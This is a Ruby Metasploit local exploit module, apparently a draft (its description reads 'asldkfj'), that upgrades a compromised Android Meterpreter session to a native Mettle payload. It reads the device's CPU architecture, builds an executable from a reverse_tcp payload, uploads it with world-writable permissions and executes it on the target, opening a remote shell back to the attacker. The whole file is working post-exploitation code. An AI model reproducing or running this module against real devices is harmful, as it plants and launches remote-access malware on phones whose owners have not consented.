##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/powershell'
require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Exploit::Local

  include Msf::Exploit::EXE
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Meterpreter to Mettle',
        'Description'   => %q{
            asldkfj
        },
        'License'       => MSF_LICENSE,
        'Platform'      => [ 'android', 'linux' ],
        'SessionTypes'  => [ 'meterpreter' ],
        'Arch'           => [ ARCH_ARMLE, ARCH_X86 ],
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
          'WfsDelay'     => 10,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { }]],
    ))
  end

  # Run method for when run command is issued
  def exploit
    print_status("Upgrading session ID: #{datastore['SESSION']}")

    unless session.type =~ /meterpreter/
      print_error("Not meterpreter")
    end
    unless session.platform =~ /android/
      #print_error("Not android, already mettle?")
      return
    end

    lplat = [Msf::Platform::Linux]
    archlist = cmd_exec("getprop ro.product.cpu.abilist")
    if archlist =~ /x86/
      larch = [ARCH_X86]
    else
      larch = [ARCH_ARMLE]
    end

    payload_exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload.encoded)
    if payload_exe.blank?
      print_error("Unable payload")
      return
    end

    tmp_path = session.fs.dir.getwd
    tmp_path = datastore['TMP_PATCH_OVERRIDE'] if datastore['TMP_PATCH_OVERRIDE']
    remote_file = "#{tmp_path}/#{Rex::Text::rand_text_alpha_lower(5)}"

    print_status("uploading #{remote_file}")
    write_file(remote_file, payload_exe)
    cmd_exec("chmod 777 #{remote_file}")
    session.sys.process.execute(remote_file, nil, {})
    #session.fs.file.rm(remote_file)
  end

end
